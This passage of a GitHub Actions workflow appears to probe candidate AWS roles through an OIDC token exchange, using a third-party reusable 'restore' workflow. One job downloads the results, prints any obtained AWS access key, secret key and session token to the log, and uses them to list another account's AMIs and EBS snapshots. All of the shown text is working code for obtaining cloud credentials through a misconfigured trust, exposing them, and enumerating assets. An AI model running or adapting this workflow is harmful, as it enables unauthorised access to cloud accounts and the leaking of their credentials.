  assume:
    needs: [configure-oidc-subject, plan-candidates]
    strategy:
      fail-fast: false
      matrix: ${{ fromJSON(needs.plan-candidates.outputs.matrix) }}
    uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@main
    with:
      mode: exchange
      entry_role: ${{ matrix.role }}
      nonce: ${{ matrix.id }}

  inspect:
    runs-on: ubuntu-latest
    needs: [plan-candidates, assume]
    if: always()
    steps:
      - name: Download artifacts from probe
        uses: actions/download-artifact@v4
        with:
          path: artifacts
      - name: Locate successful role and list cloud evidence
        shell: bash
        run: |
          set -euo pipefail
          echo "ARTIFACTS"
          find artifacts -maxdepth 3 -type f -print | sort
          entry=$(find artifacts -path "*/entry.json" -print -quit)
          if [ -z "${entry}" ]; then
            echo "NO_SUCCESSFUL_ENTRY_ROLE"
            first_claim=$(find artifacts -name oidc-claims.json -print -quit)
            if [ -n "${first_claim}" ]; then
              echo "FIRST_OIDC_CLAIM=${first_claim}"
              cat "${first_claim}"
            fi
            exit 2
          fi
          echo "ENTRY_JSON=${entry}"
          cat "${entry}"
          export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' "${entry}")
          export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' "${entry}")
          export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' "${entry}")
          aws sts get-caller-identity
          echo "DESCRIBE_IMAGES"
          aws ec2 describe-images \
            --region ap-northeast-2 \
            --owners 125746528491 \
            --filters 'Name=name,Values=metricforge-recovery-*' \
            --output json > images.json || true
          cat images.json || true
          jq -r '.Images[]? | [.ImageId,.Name,.CreationDate,((.BlockDeviceMappings[]? | select(.Ebs.SnapshotId) | .Ebs.SnapshotId) // "")] | @tsv' images.json 2>/dev/null | sort || true
          echo "DESCRIBE_SNAPSHOTS"
          aws ec2 describe-snapshots \
            --region ap-northeast-2 \
            --owner-ids 125746528491 \
            --filters 'Name=description,Values=*metricforge*,*MetricForge*,*recovery*' \
            --output json > snapshots.json || true
          cat snapshots.json || true
